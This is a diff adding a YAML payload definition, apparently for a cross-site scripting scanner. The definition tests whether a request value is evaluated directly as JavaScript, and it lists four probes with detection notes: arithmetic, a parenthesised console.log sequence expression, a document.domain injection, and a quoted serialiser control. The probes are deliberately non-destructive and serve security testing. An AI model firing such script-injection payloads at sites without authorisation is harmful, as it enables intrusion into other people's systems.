@@ -1,0 +1,26 @@
+# Directly into executable script, as an operand rather than as data. The marker
+# is computed or unique, never a literal the request also carries.
+id: xss/jscode
+title: Direct script operand evaluation
+reviewed: "2026-08-31"
+variables: [MARKER, VALUE]
+safety: >-
+  Each entry preserves the value the page expected, so the proof does not change
+  what the page then does with it.
+entries:
+  - name: computed equivalent
+    payload: "{{VALUE}}-0"
+    detect: "Read the raw body: the arithmetic present as written means the value is an operand rather than a serialised string. The page behaves identically."
+
+  - name: sequence expression
+    payload: "({{VALUE}},console.log('{{MARKER}}'))"
+    detect: "Evaluates the marker and yields the original value, so ordinary behaviour is preserved while evaluation is proved."
+    note: "The parentheses are load-bearing. In a var, let or const declaration the comma is a declaration separator rather than the comma operator, so the bare form is a syntax error that runs nothing -- including the page's own block -- and reads as a clean negative while having broken the page. Parenthesised, it evaluates in a declaration, an assignment and a call argument alike."
+
+  - name: property access
+    payload: "{{VALUE}};console.log(document.domain)"
+    detect: "The origin the block runs in, which distinguishes the page's own context from a sandboxed frame."
+
+  - name: serialiser control
+    payload: "\"{{VALUE}}\""
+    detect: "Quotes present in the body mean a serialiser stands between the parameter and the block; the parameter belongs to the string-literal unit instead."
